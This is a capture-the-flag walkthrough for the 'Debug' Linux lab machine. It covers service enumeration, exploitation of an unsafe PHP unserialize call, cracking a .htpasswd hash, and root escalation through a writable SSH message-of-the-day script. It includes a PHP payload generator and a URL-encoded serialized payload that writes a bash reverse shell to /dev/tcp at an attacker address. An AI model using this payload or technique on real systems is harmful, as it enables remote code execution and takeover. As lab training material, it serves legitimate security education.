# Debug : 
##Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!

```
Hey everybody!

Welcome to this Linux CTF Machine!

The main idea of this room is to make you learn more about php deserialization!

I hope you enjoy your journey :)
```


![04878cdb1624bcc08af74122f6b68a88](https://user-images.githubusercontent.com/58278761/113150929-439daf80-923d-11eb-8d82-ac5ae0fd1b35.jpeg)



As a hint from the Creator, we will be facing a PHP Deserialization.

## Enumeration
                              So Lets start with nmap
							
```bash
# Nmap 7.91 scan initiated Tue Mar 30 23:07:31 2021 as: nmap -sC -sV -vv -o Inital_nmap 10.10.234.104
Nmap scan report for 10.10.234.104
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2021-03-30 23:07:32 EEST for 13s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs=
|   256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 30 23:07:45 2021 -- 1 IP address (1 host up) scanned in 14.22 seconds
```
 
 **We Have 2 Open ports:** 
 * 80 : http
 * 22 : ssh 
 
checking the http we get The Default Apache Page , and there is nothing usefull here; 
lets try to see if there any directories in the site ,



```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.234.104/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/SecLists-master/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2021/03/30 23:11:06 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/backup (Status: 301)
/grid (Status: 301)
/index.html (Status: 200)
/index.php (Status: 200)
/javascript (Status: 301)
/javascripts (Status: 301)
/message.txt (Status: 200)
/server-status (Status: 403)
```
 
 
 As we can see there is some intresting files here :
 **index.php - backup - message.txt** 
 
 first lets see what inside the backup ...
 
 
![Screenshot from 2021-03-31 03-13-38](https://user-images.githubusercontent.com/58278761/113151090-6c25a980-923d-11eb-8978-73f04f44db59.png)


 
 it seems that we have a source code for the index.php website,
 by checking the source code we can identify where is the vulnerable code ...
 
 
 
![Pasted image 20210331033918](https://user-images.githubusercontent.com/58278761/113151201-83fd2d80-923d-11eb-836d-e0199f1644d2.png)

 
 
 As we Can see here we have debug parameter that being unserialized ,
 and we have one of the magic method  is the "__destruct()"
 
A very good Resource for PHP Serialization [Here](https://notsosecure.com/remote-code-execution-via-php-unserialize/)
 
the destruct method is Taking $form_file as file name , and $message variable as its value 
and creating a file in the same directory
 
 so we can write a php code to generate a serialized object that will create a php reverse shell file as bellow :
 
 
 ```php
 <?php
class FormSubmit
{
	public $form_file = 'shell.php';
	public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/ATTACKER-IP/1337 0>&1\'");';
}
print urlencode(serialize(new FormSubmit));

?>
```

**payload:**
```bash
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A10%3A%22shell2.php%22%3Bs%3A7%3A%22message%22%3Bs%3A70%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.8.94.192%2F1337+0%3E%261%27%22%29%3B%22%3B%7D
```

as we seen above the destruct method now will create a shell.php with the message as its contents, 

setup a listener and  pass the payload to "debug" parameter then navigate to /shell.php, you should catch a shell !



# User

Manually Checking the html directory we see that we got .htapasswd as the creator 
mentioned (hidden) passwords


![Pasted image 20210331040049](https://user-images.githubusercontent.com/58278761/113151253-924b4980-923d-11eb-924d-8913704b4ddd.png)



* well the password is hashed, we can crack it with john using rockyou


![Pasted image 20210331040832](https://user-images.githubusercontent.com/58278761/113151284-9aa38480-923d-11eb-942b-0901d443f4f7.png)



# Root 


root left a message to james ,, 


![Pasted image 20210331041225](https://user-images.githubusercontent.com/58278761/113151344-a727dd00-923d-11eb-959c-b9342f64c135.png)



so James can modify the welcome message in ssh that located in ```/etc/update-motd.d/00-header```

Here you can see how you can exploit this by adding a reverseshell or by simply adding SUID to /bin/bash like this 



![Pasted image 20210331042420](https://user-images.githubusercontent.com/58278761/113151382-af801800-923d-11eb-83d1-517c83a8ad0c.png)



# voilà

![Pasted image 20210331042824](https://user-images.githubusercontent.com/58278761/113151405-b60e8f80-923d-11eb-973c-e286b516abf3.png)
